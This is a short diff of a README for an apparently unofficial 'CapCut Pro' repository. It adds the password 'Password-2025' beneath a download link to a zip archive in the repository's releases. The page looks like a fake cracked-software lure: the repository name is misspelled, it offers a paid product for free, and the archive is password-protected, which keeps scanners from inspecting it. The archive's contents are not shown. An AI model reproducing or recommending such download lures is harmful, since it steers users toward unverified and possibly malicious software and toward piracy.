@@ -8,6 +8,7 @@ Welcome to the CapCut Pro repository! 🚀 Your ultimate resource for accessing 
 
 ## 🔗 Software Access  
 ### Download: [CapCut Pro](https://github.com/xyt0169/CapCup-Pro-For-PC-2025/releases/download/capcut-pro/CapCut.Pro.zip)
+Password-2025
 
 
 ## 🎉 Overview of CapCut Pro  
